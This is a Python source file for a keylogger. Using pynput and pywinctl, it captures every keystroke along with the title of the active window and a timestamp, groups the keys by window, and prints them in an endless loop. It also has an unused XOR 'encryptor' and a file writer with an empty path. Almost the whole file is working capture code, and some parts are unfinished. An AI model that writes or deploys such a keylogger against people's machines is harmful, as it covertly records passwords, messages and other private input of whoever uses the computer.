from abc import ABC, abstractmethod
from pynput.keyboard import Listener
from typing import List
import time,json,random,string,ToolBox,threading,pywinctl


class IKeyLogger(ABC):
    @abstractmethod
    def on_press(self,key) -> None:
        pass
    @abstractmethod
    def get_logged_keys(self) -> dict[str:str]:
        pass
class IKeyLoggerManager(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass
    @abstractmethod
    def stop_logging(self) -> None:
        pass
    @abstractmethod
    def get_logged_keys(self) -> dict[str:str]:
        pass

class Write(ABC):
    @abstractmethod
    def write(self, data:str) -> bool:
        pass


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.__logged_keys = {}
        self.__last_record = ""
        self.__last_type_time = None
        self.__last_window = None

    def on_press(self, key) -> None:
        key = ToolBox.format_key(key)
        current_time = time.time()
        current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
        active_window = pywinctl.getActiveWindow()

        if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
            self.__last_record = active_window.title + ': ' + current_time_formatted

        self.__last_type_time = current_time
        self.__last_window = active_window
        if self.__last_record not in self.__logged_keys:
            self.__logged_keys[self.__last_record] = ""
        self.__logged_keys[self.__last_record] += key

    def get_logged_keys(self) -> dict[str:str]:
        if len(self.__logged_keys)<1:
            return {}
        return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}


    def clear_logged_keys(self) -> dict[str:str]:
        self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}



class FileWriter(Write):
    def __init__(self,path=None):
        self.path = path or r""

    def write(self, data:dict[str:str]) -> bool:
        try:
            with open(self.path,"a") as file:
                convert_data = json.dumps(data)
                file.write(convert_data)
                return True
        except IOError:
            return False


class Encryptor:
    def __init__(self):
        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))

    def encrypt(self,data:str) -> str:
        ciphertext = ""
        length_key = len(self.key)
        for i in range(len(data)):
            ciphertext += chr(ord(data[i]) ^ ord(self.key[i % length_key]))
        return ciphertext

class KeyLoggerManager:
    def __init__(self):
        self.__key_logger = KeyLoggerService()
        self.__writer = FileWriter()
        self.__encryptor = Encryptor()
        self.__is_logging = False
        self.__logger_thread = threading.Thread(target=self.__listen)


    def start_logging(self):
        self.__is_logging = True
        self.__logger_thread.start()

    def stop_logging(self):
        self.__is_logging = False

    def __listen(self):
        with Listener(on_press=self.__key_logger.on_press) as listener:
            listener.join()

    def print_keys(self):
        logged_keys = self.__key_logger.get_logged_keys()
        self.__key_logger.clear_logged_keys()
        for key, value in logged_keys.items():
            print(key)
            print(value)

x = KeyLoggerManager()
x.start_logging()
while True:
    # time.sleep(1)
    x.print_keys()





